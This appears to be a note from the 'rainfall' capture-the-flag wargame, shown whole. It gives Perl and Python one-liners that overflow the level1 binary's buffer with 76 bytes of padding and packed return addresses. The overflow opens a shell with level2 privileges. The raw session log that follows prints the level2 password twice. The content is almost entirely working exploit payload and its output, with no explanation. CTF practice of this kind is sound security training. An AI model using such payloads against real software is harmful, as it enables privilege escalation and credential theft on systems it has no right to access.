# rainfall

 ( perl -e 'print "A"x76 . "\x60\x83\x04\x08" . "\xef\xbe\xad\xde" . "\x58\xcc\xf8\xb7"' ; cat ) | ./level1
whoaim

d
/bin/sh: 2: d: not found
id
uid=2030(level1) gid=2030(level1) euid=2021(level2) egid=100(users) groups=2021(level2),100(users),2030(level1)
whoaim
/bin/sh: 4: whoaim: not found
whoami
level2
cat /home/level2/.pass
cat: /home/level2/.pass: No such file or directory
id
uid=2030(level1) gid=2030(level1) euid=2021(level2) egid=100(users) groups=2021(level2),100(users),2030(level1)
ls
ls: cannot open directory .: Permission denied
cd ..
ls
ls: cannot open directory .: Permission denied
cd level2
ls
level2
cat .pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77



 ( python -c 'print("A" * 76 + "\x60\x83\x04\x08" + "\xef\xbe\xad\x
de" + "\x58\xcc\xf8\xb7")'; cat ) | ./level1
whoami
level2
cd
/bin/sh: 2: cd: can't cd to /home/user/level1
cd ..
ls
ls: cannot open directory .: Permission denied
cd level2
cat .pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77